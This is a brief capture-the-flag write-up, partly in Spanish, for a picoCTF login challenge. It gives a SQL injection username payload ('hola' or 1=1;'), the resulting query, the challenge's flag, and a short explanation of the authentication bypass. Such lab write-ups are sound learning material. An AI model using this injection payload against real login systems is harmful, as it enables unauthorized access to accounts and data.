
## Descripción

There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
Hints:
1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.
## Solución 

~~~
username: hola' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='hola' or 1=1;' AND password='admin'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}

~~~

~~~
picoCTF{s0m3_SQL_fb3fe2ad}
~~~
## Notas adicionales 
Probamos inyectar código SQL en el campo de usuario con una condición siempre verdadera (`OR 1=1;`) para evadir la autenticación. El sitio no validaba correctamente las entradas, lo que nos permitió iniciar sesión sin credenciales válidas y obtener la bandera.
## Referencias
